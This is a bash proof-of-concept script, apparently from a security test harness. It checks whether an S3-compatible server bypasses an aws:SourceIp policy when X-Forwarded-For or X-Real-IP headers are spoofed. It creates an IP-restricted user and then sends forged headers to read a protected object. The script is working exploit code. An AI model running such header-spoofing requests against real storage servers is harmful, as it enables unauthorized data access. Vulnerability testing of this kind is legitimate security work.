#!/usr/bin/env bash
# F-10 — aws:SourceIp policy bypass via spoofed X-Forwarded-For / X-Real-IP (default-on XFF trust).
# Prereq: setup/01-single-node.sh
set -euo pipefail
. "$(dirname "$0")/../../setup/env.sh"
HARNESS="$(cd "$(dirname "$0")/../../harness" && pwd)"
T=${1:-$S1}; HOST=${T#*//}

echo "=== setup: user whose GetObject is allowed ONLY from 10.99.99.0/24 (attacker is not in range) ==="
mcsh '
mc alias set L '"$T"' '"$ROOT_USER"' '"$ROOT_PASS"' >/dev/null 2>&1
mc mb -p L/tenant-a >/dev/null 2>&1; printf "ip-secret\n" | mc pipe L/tenant-a/secret.txt >/dev/null 2>&1
cat > /tmp/ipcond.json <<POL
{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":["s3:GetObject"],"Resource":["arn:aws:s3:::tenant-a/*"],"Condition":{"IpAddress":{"aws:SourceIp":"10.99.99.0/24"}}}]}
POL
mc admin policy create L ip-only /tmp/ipcond.json >/dev/null 2>&1
mc admin user add L ipuser ippass12345 >/dev/null 2>&1
mc admin policy attach L ip-only --user ipuser >/dev/null 2>&1
'
echo "=== attack: spoof the source IP via X-Forwarded-For / X-Real-IP ==="
python3 - "$HOST" "$HARNESS" <<'PY'
import sys; HOST,HARNESS=sys.argv[1],sys.argv[2]; sys.path.insert(0,HARNESS); import s3sig
def g(extra,label):
    st,h,b=s3sig.send("ipuser","ippass12345","GET","/tenant-a/secret.txt",extra_headers=extra,host=HOST)
    body=b.decode(errors="replace")
    print(f"  [{label}] HTTP {st}  {'-> '+body.strip() if st==200 else '(denied)'}")
g({},                                 "no header (real IP not in range)")
g({"X-Forwarded-For":"10.99.99.50"},  "X-Forwarded-For: 10.99.99.50 (spoofed in-range)")
g({"X-Real-IP":"10.99.99.50"},        "X-Real-IP: 10.99.99.50 (spoofed)")
g({"X-Forwarded-For":"8.8.8.8"},      "X-Forwarded-For: 8.8.8.8 (out-of-range control)")
PY
echo
echo "VULNERABLE if: no-header=403, spoofed-in-range=200, out-of-range control=403."
